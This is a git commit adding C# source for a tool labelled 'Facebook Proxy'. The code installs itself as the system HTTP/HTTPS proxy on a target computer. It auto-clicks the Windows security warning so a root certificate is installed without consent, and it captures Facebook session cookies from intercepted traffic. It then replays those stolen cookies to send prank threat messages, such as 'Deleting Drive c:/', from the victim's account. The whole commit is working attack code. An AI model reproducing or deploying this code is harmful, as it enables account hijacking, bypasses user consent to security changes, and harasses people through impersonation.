c9499f82bd83d509f725d3ce08644221fedf0efb
xcxooxl <dudinirgad@Gmail.com>
2016-06-30 15:09:43 +0300

    Facebook Proxy =]
    opens a proxy on target computer.
    steals facebook cookies and send fb chat messages.

---
+++ faceProxy/Program.cs
@@ -0,0 +1,146 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+using System.Threading;
+
+namespace Titanium.Web.Proxy.Examples.Basic
+{
+    public class Program
+    {
+        private static readonly evilProxy Controller = new evilProxy();
+        
+
+        //imports needed for bypassing warning window..
+        [DllImport("user32.dll")]
+        static extern IntPtr GetDlgItem(IntPtr hWnd, int nIDDlgItem);
+        [DllImport("user32.dll")]
+        static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, IntPtr lParam);
+
+        private static string to = ""; //Who you want to troll?
+        public static void Main(string[] args)
+        {
+            //On Console exit make sure we also exit the proxy
+            NativeMethods.Handler = ConsoleEventCallback;
+            NativeMethods.SetConsoleCtrlHandler(NativeMethods.Handler, true);
+
+            Console.WriteLine("Please enter user fbid to troll : ");
+            to = Console.ReadLine();
+            if(Regex.Match(to,"[0-9]+").Value.Length != to.Length)
+            {
+                Console.WriteLine("incorrect fbid, Program will now exit ..");
+                Thread.Sleep(3000);
+                return;
+            }
+
+            Console.WriteLine("fbid Target : " + to);
+            Console.WriteLine("enter www.facebook.com..");
+            Console.WriteLine("proxy will steal the cookies..");
+            Console.WriteLine("after cookie is found press any key to send messages =]");
+
+
+            //bypass security warning to add root certificate
+            //when the warning window opens, it auto-clicks on the yes button =]
+            new Thread(() =>
+            {
+                IntPtr wHandle = IntPtr.Zero;
+
+                bool found = false;
+                for (int i = 0; i < 25 && !found; i++)
+                {
+                    foreach (var process in Process.GetProcesses())
+                    {
+                        if (process.MainWindowTitle.Contains("Security Warning")) //finding the Security Warning Window
+                        {
+                            wHandle = process.MainWindowHandle; // Saving Handle
+                            found = true;
+                            break;
+                        }
+                    }
+                    Thread.Sleep(100); //scanning for warning window in 2.5 seconds
+                    //after the first run this is not needed.. but still good to keep.
+                }
+                if (wHandle != IntPtr.Zero)
+                {
+                    IntPtr hWndButton = GetDlgItem(wHandle, 6); //find Yes Button.. id = 6  
+                    SendMessage(hWndButton, 0x00F5, 0,IntPtr.Zero); //clicking YES ! ;)
+                    //SendMessage(wHandle, WM_COMMAND, wParam, hWndButton);
+                }
+
+
+            }).Start();
+            //Start proxy controller
+            Controller.StartProxy();
+
+            Console.WriteLine("Waiting for cookie...");
+            Console.ReadLine();
+            new Thread(() =>
+            {
+               
+                Controller.sendMessage("Hacking your computer...", to);
+                for (long i = 2; i <= long.MaxValue; i = i*5)
+                {
+                    if (i <= 0 || i*5<=0) break;
+                    var msg = i + "*" + 5 + "=" + i * 5 + " Hex = " + i.ToString("X8");
+
+                    Controller.sendMessage(msg+"0x",to);
+                    Thread.Sleep(100);
+                }
+
+                //lets trick this guy into thinking we hacked him :D
+                Controller.sendMessage("Formatting Computer ... 80%",to);
+                Thread.Sleep(500);
+                Controller.sendMessage("Deleting Drive c:/ ... 90%", to);
+                Thread.Sleep(500);
+                Controller.sendMessage("Shutting Down Computer ... 99%", to);
+                Thread.Sleep(500);
+                Controller.sendMessage("5", to);
+                Thread.Sleep(900);
+                Controller.sendMessage("4", to);
+                Thread.Sleep(900);
+                Controller.sendMessage("3", to);
+                Thread.Sleep(900);
+                Controller.sendMessage("2", to);
+                Thread.Sleep(900);
+                Controller.sendMessage("1", to);
+                Thread.Sleep(900);
+                Controller.sendMessage("Bye !!!!", to);
+                Console.WriteLine("Press Enter to exit...");
+            }
+            ).Start();
+
+            //Controller.sendMessage("Hack Finished");
+            Console.WriteLine("Sending Messages.. Please Wait.");
+            Console.ReadLine();
+
+            Controller.Stop();
+        }
+
+
+        private static bool ConsoleEventCallback(int eventType)
+        {
+            if (eventType != 2) return false;
+            try
+            {
+                Controller.Stop();
+            }
+            catch
+            {
+                // ignored
+            }
+            return false;
+        }
+    }
+
+    internal static class NativeMethods
+    {
+        // Keeps it from getting garbage collected
+        internal static ConsoleEventDelegate Handler;
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        internal static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
+
+        // Pinvoke
+        internal delegate bool ConsoleEventDelegate(int eventType);
+    }
+}
---
+++ faceProxy/faceProxy.cs
@@ -0,0 +1,108 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Threading.Tasks;
+using Titanium.Web.Proxy.EventArguments;
+using Titanium.Web.Proxy.Models;
+
+namespace Titanium.Web.Proxy.Examples.Basic
+{
+    public class evilProxy
+    {
+        private ProxyServer proxyServer;
+        private string cookie = "";
+        private string from = "";
+
+        public evilProxy()
+        {
+            proxyServer = new ProxyServer();
+        }
+
+        public void StartProxy()
+        {
+            proxyServer.BeforeRequest += OnRequest;
+            var explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Any, 8000, true);
+
+            proxyServer.AddEndPoint(explicitEndPoint);
+            proxyServer.Start();
+            
+            
+            foreach (var endPoint in proxyServer.ProxyEndPoints)
+                Console.WriteLine("Listening on '{0}' endpoint at Ip {1} and port: {2} ",
+                    endPoint.GetType().Name, endPoint.IpAddress, endPoint.Port);
+
+            //Only explicit proxies can be set as system proxy!
+            proxyServer.SetAsSystemHttpProxy(explicitEndPoint);
+            proxyServer.SetAsSystemHttpsProxy(explicitEndPoint);
+        }
+
+        public void Stop()
+        {
+            proxyServer.BeforeRequest -= OnRequest;
+
+            proxyServer.Stop();
+        }
+
+        //intecept & cancel, redirect or update requests
+        public async Task OnRequest(object sender, SessionEventArgs e)
+        {
+            if (!e.WebSession.Request.Url.Contains("https://www.facebook.com/")) return;
+
+            if (cookie.Length > 40) return;
+            cookie = e.WebSession.Request.RequestHeaders.Find(x => x.Name == "Cookie").Value;
+
+            Console.WriteLine(e.WebSession.Request.RequestHeaders.Find(x => x.Name == "Cookie").Value);
+            Console.WriteLine("Faceook Cookie Found !!!! :D");
+
+            var match = Regex.Match(cookie,"c_user=[0-9]+[;]");
+            from = Regex.Match(match.Value, "[0-9]+").Value;
+            Console.WriteLine("User Found : " + from);
+           
+        }
+
+        /// <summary>
+        /// use this to send messages to user on facebook
+        /// wuth our stolen cookie
+        /// </summary>
+        /// <param name="msg">msg content</param>
+        /// <param name="to">user to send the message to</param>
+        public void sendMessage(string msg,string to)
+        { 
+                int num = new Random().Next(10000, 90000); //random thread id =]
+      
+                WebClient client = new WebClient();
+                string data = "message_batch%5B0%5D%5Baction_type%5D=ma-type%3Auser-generated-message&message_batch%5B0%5D%5Bthread_id%5D=&message_batch%5B0%5D%5Bauthor%5D=fbid%3A" + from + "&message_batch%5B0%5D%5Bauthor_email%5D=&message_batch%5B0%5D%5Btimestamp%5D=1467213876031&message_batch%5B0%5D%5Btimestamp_absolute%5D=Today&message_batch%5B0%5D%5Btimestamp_relative%5D=6%3A24pm&message_batch%5B0%5D%5Btimestamp_time_passed%5D=0&message_batch%5B0%5D%5Bis_unread%5D=false&message_batch%5B0%5D%5Bis_forward%5D=false&message_batch%5B0%5D%5Bis_filtered_content%5D=false&message_batch%5B0%5D%5Bis_filtered_content_bh%5D=false&message_batch%5B0%5D%5Bis_filtered_content_account%5D=false&message_batch%5B0%5D%5Bis_filtered_content_quasar%5D=false&message_batch%5B0%5D%5Bis_filtered_content_invalid_app%5D=false&message_batch%5B0%5D%5Bis_spoof_warning%5D=false&message_batch%5B0%5D%5Bsource%5D=source%3Achat%3Aweb&message_batch%5B0%5D%5Bsource_tags%5D%5B0%5D=source%3Achat&message_batch%5B0%5D%5Bbody%5D=" + msg + "&message_batch%5B0%5D%5Bhas_attachment%5D=false&message_batch%5B0%5D%5Bhtml_body%5D=false&message_batch%5B0%5D%5Bspecific_to_list%5D%5B0%5D=fbid%3A" + to + "&message_batch%5B0%5D%5Bspecific_to_list%5D%5B1%5D=fbid%3A" + from + "&message_batch%5B0%5D%5Bui_push_phase%5D=V3&message_batch%5B0%5D%5Bstatus%5D=0&message_batch%5B0%5D%5Boffline_threading_id%5D=61539410290954" + num + "&message_batch%5B0%5D%5Bmessage_id%5D=61539410290954" + num + "&message_batch%5B0%5D%5Bephemeral_ttl_mode%5D=0&message_batch%5B0%5D%5Bmanual_retry_cnt%5D=0&message_batch%5B0%5D%5Bother_user_fbid%5D=" + to + "&client=mercury&__user=" + from + "&__a=1&__dyn=7AmajEzUGByA5Q9UoHaEWC5ER6yUmyUyGiyEyeqrWo8popyui9wWhEoyUnwgUb8eQ4UJi28rxuF8W4emVWxeUWq58O5pQEd99uum4UpK6q-FFUlxrxOcxu5ocE88C9z9oybx24o9Esw&__req=v&__be=-1&__pc=PHASED%3ADEFAULT&fb_dtsg=AQFVUmjwSCO3%3AAQFsBih81IIO&ttstamp=265817086851091061198367795158658170115661051045649737379&__rev=2419142";
+               
+                client.Headers.Add(HttpRequestHeader.Cookie, cookie); //our stolen cookie ;)
+                client.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded");
+                client.Headers.Add("Origin", "https://www.facebook.com");
+                client.Headers.Add("X-MSGR-Region", "LLA");
+                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36");
+                client.Headers.Add("Accept", "*/*");
+                client.Headers.Add("Referer", "https://www.facebook.com/");
+                client.Headers.Add(HttpRequestHeader.AcceptEncoding, "gzip,deflate,zlib");
+                client.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US,en;q=0.8");
+                try
+                {
+                    var payload = "message_batch%5B0%5D%5Baction_type%5D=ma-type%3Auser-generated-message&message_batch%5B0%5D%5Bthread_id%5D=&message_batch%5B0%5D%5Bauthor%5D=fbid%3A" + from + "&message_batch%5B0%5D%5Bauthor_email%5D=&message_batch%5B0%5D%5Btimestamp%5D=1467213876031&message_batch%5B0%5D%5Btimestamp_absolute%5D=Today&message_batch%5B0%5D%5Btimestamp_relative%5D=6%3A24pm&message_batch%5B0%5D%5Btimestamp_time_passed%5D=0&message_batch%5B0%5D%5Bis_unread%5D=false&message_batch%5B0%5D%5Bis_forward%5D=false&message_batch%5B0%5D%5Bis_filtered_content%5D=false&message_batch%5B0%5D%5Bis_filtered_content_bh%5D=false&message_batch%5B0%5D%5Bis_filtered_content_account%5D=false&message_batch%5B0%5D%5Bis_filtered_content_quasar%5D=false&message_batch%5B0%5D%5Bis_filtered_content_invalid_app%5D=false&message_batch%5B0%5D%5Bis_spoof_warning%5D=false&message_batch%5B0%5D%5Bsource%5D=source%3Achat%3Aweb&message_batch%5B0%5D%5Bsource_tags%5D%5B0%5D=source%3Achat&message_batch%5B0%5D%5Bbody%5D=" + msg + "&message_batch%5B0%5D%5Bhas_attachment%5D=false&message_batch%5B0%5D%5Bhtml_body%5D=false&message_batch%5B0%5D%5Bspecific_to_list%5D%5B0%5D=fbid%3A" + to + "&message_batch%5B0%5D%5Bspecific_to_list%5D%5B1%5D=fbid%3A" + from + "&message_batch%5B0%5D%5Bui_push_phase%5D=V3&message_batch%5B0%5D%5Bstatus%5D=0&message_batch%5B0%5D%5Boffline_threading_id%5D=61539410290954" + num + "&message_batch%5B0%5D%5Bmessage_id%5D=61539410290954" + num + "&message_batch%5B0%5D%5Bephemeral_ttl_mode%5D=0&message_batch%5B0%5D%5Bmanual_retry_cnt%5D=0&message_batch%5B0%5D%5Bother_user_fbid%5D=" + to + "&client=mercury&__user=" + from + "&__a=1&__dyn=7AmajEzUGByA5Q9UoHaEWC5ER6yUmyUyGiyEyeqrWo8popyui9wWhEoyUnwgUb8eQ4UJi28rxuF8W4emVWxeUWq58O5pQEd99uum4UpK6q-FFUlxrxOcxu5ocE88C9z9oybx24o9Esw&__req=v&__be=-1&__pc=PHASED%3ADEFAULT&fb_dtsg=AQFVUmjwSCO3%3AAQFsBih81IIO&ttstamp=265817086851091061198367795158658170115661051045649737379&__rev=2419142";
+                    client.UploadString("https://www.facebook.com/ajax/mercury/send_messages.php?dpr=1", payload);
+                    Console.WriteLine("Sending : " + msg);
+                }
+                catch (Exception)
+                {
+                    //Console.WriteLine("fail");
+                }
+        }
+
+
+        //Modify response
+        /*
+        public async Task OnResponse(object sender, SessionEventArgs e)
+        {
+        }
+        */
+    }
+}
